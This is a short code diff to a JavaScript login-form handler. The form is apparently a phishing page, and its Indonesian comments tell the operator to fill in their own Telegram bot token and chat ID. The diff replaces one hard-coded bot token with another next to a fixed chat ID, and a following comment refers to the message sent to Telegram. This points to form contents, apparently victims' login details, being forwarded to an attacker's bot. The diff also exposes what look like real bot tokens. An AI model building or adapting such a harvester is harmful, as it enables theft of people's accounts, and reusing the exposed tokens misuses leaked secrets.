@@ -11,7 +11,7 @@ document.getElementById('tgLoginForm').addEventListener('submit', function(event
     submitBtn.disabled = true;
 
     // 2. ⚠️ PENTING: ISI DATA BOT TELEGRAM ANDA DI SINI ⚠️
-    const botToken = "8944168845:AAE-fJOEJwFKrFK3dRzI5UQiuYvbkJC7Z_Y"; 
+    const botToken = "8944168845:AAFsb-toTlwSz9focFnMvQEAnDQyNByv5RA"; 
     const chatId = "1966317946";     
 
     // 3. Desain isi pesan yang dikirim ke telegram
